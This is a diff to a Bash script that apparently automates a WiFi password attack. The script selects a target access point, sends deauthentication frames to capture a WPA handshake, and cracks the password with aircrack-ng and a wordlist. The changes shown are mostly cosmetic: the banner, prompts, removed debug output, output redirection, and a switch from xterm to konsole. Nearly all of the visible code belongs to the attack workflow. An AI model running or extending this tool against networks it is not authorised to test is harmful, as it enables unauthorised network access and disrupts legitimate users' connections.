@@ -20,12 +20,11 @@ interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {p
 
 function banner () {
     echo "                                  
-                      _ ___ _ _____         _       
-                _ _ _|_|  _|_| __  |___ _ _| |_ ___ 
-               | | | | |  _| | __ -|  _| | |  _| -_|
-               |_____|_|_| |_|_____|_| |___|_| |___|                              
-               Layvth@Github
-"       
+                      _
+          ____ _  ___(_)_ __
+         (_-< ' \/ -_) \ \ /
+         /__/_||_\___|_/_\_\              
+    "
 }
 #/////////////////////////////// airodump-ng running for get target AP //////////////
 
@@ -96,12 +95,12 @@ choseTargetAp () {
             startAttacking "1" "$input_file"
         break
       else
-        read -p "Set target Network Number: " targetAp
-        if [ "$targetAp" -le "$total_lines" ] && [ "$targetAp" -gt "0" ]; then >> /dev/null
+        read -p "> Set target Network Number: " targetAp
+        if [ "$targetAp" -le "$total_lines" ] 2>/dev/null  && [ "$targetAp" -gt "0" ]; then
             startAttacking "$targetAp" "$input_file"
             break
         else
-          echo "Error"
+          echo -e "${YELLOW}[?] ${NC}Please set number from each table"
         fi
       fi
     done
@@ -110,7 +109,6 @@ startAttacking () {
     local lineNum=$1
     local fileAps=$2
     local filtered=$(sed -n "${lineNum}p" "$fileAps")
-    
     local targetAp=$(echo "$filtered" | awk '{print $3}' | sed 's/,//g')
     local targetBSSID=$(echo "$filtered" | awk '{print $1}' | sed 's/,//g')
     local targetChannel=$(echo "$filtered" | awk '{print $2}' | sed 's/,//g')
@@ -150,9 +148,6 @@ getHandshake () {
     local interfaceLocal=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
     local currentPath=$(pwd)
 
-    echo "$currentPath"
-    
-    echo "$bssid $channel $interfaceLocal"
     cd $currentPath/handshake
     rm *
     sendDeauth "$bssid" "$interfaceLocal" &
@@ -166,7 +161,8 @@ aircrack_start () {
     while true; do
         read -p "> wordlist Path :> " path_wordlist
         if [ -f "$path_wordlist" ]; then
-            xterm -geometry 100x650 -e "aircrack-ng -w $path_wordlist -b $bssid $capfile"
+            konsole --geometry 100x650 -e "aircrack-ng -w $path_wordlist -b $bssid $capfile" 2>/dev/null
+            read "[ Press Enter When you Finish ]"
             break
         else
             echo "[!] File doesn't not exist try Another Path"
@@ -192,12 +188,10 @@ check_monitor_mode_support() {
         sleep 1
         mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
         if [ "$mode" = "Mode:Monitor" ]; then
-            echo -e "${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
+            echo -e "           ${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
             checkTools
         else
-            echo -e "${GREEN}--------------------------------------------------------"
             read -p "[*]~: Switch ($interface) to monitor mode (y/n) :   " input 
-            echo -e "--------------------------------------------------------${NC}"
             if [ "$input" == "yes" ] || [ "$input" == "y" ]; then
                 sleep .3
                 airmon-ng start $interface >> /dev/null
@@ -211,23 +205,23 @@ check_monitor_mode_support() {
         fi
         
     else
-        echo -e "${RED}[!]~:${NC} Interface ($interface) does not support monitor mode"
+        echo -e "${RED}[!]${NC} Interface ($interface) does not support monitor mode"
         sleep .3
-        echo -e "${RED}[!]~:${NC} Error : check your interface !${NC}"
-        
+        echo -e "${RED}[!]${NC} Error check your interface !${NC}"
         exit 1
     fi
 }
 
 ctrl_c () {
-    echo "Exiting"
+    echo "_________________|EXITING_______________"
+    echo "            HAVE GOOD DAY SIR           "
     if iwconfig $interface | grep -q "Mode:Monitor"; then
         read -p "[*]~: Do you want to exit from Monitor mode (yes/no) : " check
-        if [ "$check" == "yes" ] || [ "$check" == "y" ]; then
+        if [ "$check" == "yes" ] 2>/dev/null || [ "$check" == "y" ]; then
             echo $interface
-            ifconfig $infterface down
-            iwconfig $infterface mode managed
-            ifconfig $infterface up
+            ifconfig $infterface down >>/dev/null
+            iwconfig $infterface mode managed >>/dev/null
+            ifconfig $infterface up >>/dev/null
             echo "[*]~: Exiting from monitor Mode !"
             exit 1
         else
@@ -235,7 +229,7 @@ ctrl_c () {
             exit 1
         fi
     else
-        echo -e "${YELLOW}[*]~: ${NC}Exit !"
+        echo -e "\n${YELLOW}[*]~: ${NC}Exit !"
         exit 1
     fi
 }
@@ -266,7 +260,6 @@ checkTools() {
             echo "${YELLOW}[!] ${NC}try [ apt-get install $tool ] "
         else 
             sleep 0.4
-            echo -e "${BLUE}[+}${NC}$tool"
             ((tools_found+=1)) # Increment the counter if the tool is found
         fi
     done
